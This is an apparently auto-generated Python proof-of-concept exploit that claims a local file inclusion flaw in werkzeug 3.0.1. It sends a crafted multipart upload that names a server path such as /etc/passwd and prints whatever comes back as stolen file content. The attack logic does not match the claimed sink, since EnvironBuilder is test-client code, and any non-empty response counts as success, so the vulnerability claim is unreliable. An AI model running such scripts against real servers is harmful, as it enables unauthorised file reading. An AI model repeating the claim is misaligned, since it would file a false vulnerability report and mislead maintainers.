#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: lfi-000
# Sink: add_file
# Auto-generated — run with: python3 lfi_environbuilder_construction_supplied_data_add_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in werkzeug 3.0.1.

Vulnerability: The `add_file` method in `FileMultiDict` opens a file specified
by a string without any path sanitization. The `_add_file_from_data` entry point
in `EnvironBuilder` passes user-controlled data from the `data` dict to `add_file`,
allowing an attacker to read arbitrary files on the server.

This PoC demonstrates the vulnerability by reading `/etc/passwd` from the target.
"""

import requests
import sys
import argparse
from urllib.parse import urljoin

def exploit(target_url, file_to_read="/etc/passwd"):
    """
    Exploit the LFI vulnerability by sending a crafted multipart form request.

    Args:
        target_url (str): Base URL of the vulnerable application.
        file_to_read (str): Path of the file to read on the server.

    Returns:
        str: Content of the file if successful, None otherwise.
    """
    # The vulnerability is triggered when constructing an EnvironBuilder from
    # multipart form data. We send a POST request with a file field where the
    # filename is the path we want to read.
    
    # Craft the malicious multipart data
    # The key is the field name, value is a tuple (filename, file_content, content_type)
    # But here we exploit the fact that `add_file` accepts a string as `file` parameter
    # and opens it directly. We set the filename to the target path.
    
    # We need to send the data in a way that triggers `_add_file_from_data`
    # This happens when the `data` parameter of EnvironBuilder contains tuples
    # with file information.
    
    # For a direct HTTP request, we can send a multipart form with a file field
    # where the filename is the path we want to read.
    
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Attempting to read: {file_to_read}")
    
    # Create a multipart form with a file field
    # The filename parameter is the path we want to read
    files = {
        'file': (file_to_read, 'dummy_content', 'application/octet-stream')
    }
    
    try:
        # Send POST request with the malicious file field
        response = requests.post(
            target_url,
            files=files,
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        
        # The file content might appear in the response body
        # depending on how the application processes the uploaded file
        if response.text:
            print(f"[*] Response body (first 500 chars): {response.text[:500]}")
            return response.text
        else:
            print("[!] Empty response body")
            return None
            
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        return None
    except requests.exceptions.Timeout as e:
        print(f"[!] Timeout error: {e}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug 3.0.1 LFI vulnerability"
    )
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://localhost:5000/upload)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read on the server (default: /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    print("[*] Werkzeug 3.0.1 LFI PoC")
    print("[*] =======================")
    
    result = exploit(args.target, args.file)
    
    if result:
        print("\n[+] Exploit successful! File content retrieved.")
        print("[+] Full content:")
        print(result)
    else:
        print("\n[-] Exploit failed. The target may not be vulnerable or the file doesn't exist.")
        print("[*] Note: This PoC assumes the application processes file uploads")
        print("[*] and reflects the file content in the response.")

if __name__ == "__main__":
    main()
